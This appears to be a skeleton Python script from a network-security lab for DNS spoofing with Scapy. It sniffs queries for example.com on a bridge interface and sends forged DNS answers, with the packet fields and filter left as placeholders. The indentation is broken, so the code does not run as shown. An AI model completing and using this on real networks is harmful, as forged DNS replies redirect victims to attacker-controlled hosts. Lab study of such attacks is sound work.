#!/usr/bin/env python3
from scapy.all import *
import sys

NS_NAME = "example.com"

def spoof_dns(pkt):
if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode("utf-8")):
    print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
    ip = IP(...) # Create an IP object
    udp = UDP(...) # Create a UPD object
    Anssec = DNSRR(...) # Create an answer record
    dns = DNS(...) # Create a DNS object
    spoofpkt = ip/udp/dns # Assemble the spoofed DNS packet
    send(spoofpkt)

    myFilter = "..." # Set the filter
    pkt=sniff(iface="br-43d947d991eb", filter=myFilter, prn=spoof_dns)
